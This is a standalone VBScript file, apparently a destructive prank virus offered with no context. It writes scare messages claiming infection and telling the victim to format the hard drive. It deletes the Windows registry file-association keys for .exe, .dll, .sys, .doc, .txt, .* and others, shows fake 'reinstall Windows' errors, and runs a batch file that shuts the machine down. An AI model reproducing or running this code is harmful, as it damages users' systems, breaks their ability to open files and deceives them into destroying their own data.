   set a=CreateObject("WScript.Shell")
   dim abc,message
   set abc=CreateObject("Scripting.FileSystemObject")
   set message=abc.CreateTextFile("C:\message.txt")
   message.WriteLine""
   message.WriteLine""
   message.WriteLine"          YOURE COMPUTER HAS BEEN INFECTED"
   message.WriteLine""
   message.WriteLine"          PLEASE PANIC THIS IS NO A DRILL"
   message.WriteLine""
   message.WriteLine"    YOU SHOULD BE MORE CAREFUL WHEN SURFING THE NET"
   message.WriteLine""
   message.WriteLine"        THIS MESSAGE WAS BROUGHT TO YOU BY ***"
   message.WriteLine""
   message.WriteLine" IF YOU WANT TO GET RID OF THIS VIRUS FORMAT YOU HARD DRIVE"
   message.WriteLine""
   message.WriteLine""
   message.Close
   dim d,msg
   set d=CreateObject("Scripting.FileSystemObject")
   set virus=d.CreateTextFile("C:\virus.html")
   virus.WriteLine"<html>"
   virus.WriteLine"<head><title>VIRUS</title></head>"
   virus.WriteLine"<body>"
   virus.WriteLine"<p> YOURE COMPUTER HAS BEEN INFECTED </p><br>"
   virus.WriteLine"<p>                                           </p><br>"
   virus.WriteLine"<p> PLEASE PANIC THIS IS NO A DRILL  </p><br>"
   virus.WriteLine"<p>                                           </p><br>"
   virus.WriteLine"<p> YOU SHOULD BE MORE CAREFUL WHEN SURFING THE NET </p><br>"
   virus.WriteLine"<p>                                            </p><br>"
   virus.WriteLine"<p> THIS MESSAGE WAS BROUGHT TO YOU BY *** </p><br>"
   virus.WriteLine"<p>                                               </p><br>"
   virus.WriteLine"<p> IF YOU WANT TO GET RID OF THIS VIRUS FORMAT YOU HARD DRIVE </p><br>"
   virus.WriteLine"</body"
   virus.WriteLine"</html>"
   virus.close
   dim g,shut
   set g=CreateObject("Scripting.FileSystemObject")
   set shut=g.CreateTextFile("C:\shut.bat")
   shut.WriteLine"@echo off"
   shut.WriteLine"%windir%rundll32.exe User,ExitWindows"
   shut.WriteLine"%systemdir%RUNDLL32.EXE User,ExitWindows"
   shut.WriteLine"exit"
   shut.Close
   set Reg=CreateObject("wscript.shell")
   Reg.RegDelete"HKEY_CLASSES_ROOT\.doc\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.txt\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.bat\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.zip\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.exe\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.html\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.vbs\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.dll\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.sys\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.log\"
   Reg.RegDelete"HKEY_CLASSES_ROOT\.*\"
   Reg.RegWrite "HKEY_LOCAL_MACHINE\software\Ipnuker","1"
   Reg.RegWrite "HKEY_LOCAL_MACHINE\Hardware\Ipnuker","1"
   msgbox "ERROR","ERROR"
   msgbox "PLEASE REINSTALL WINDOWS","ERROR"
   Reg.Run "c:\shut.bat"
   Reg.Close
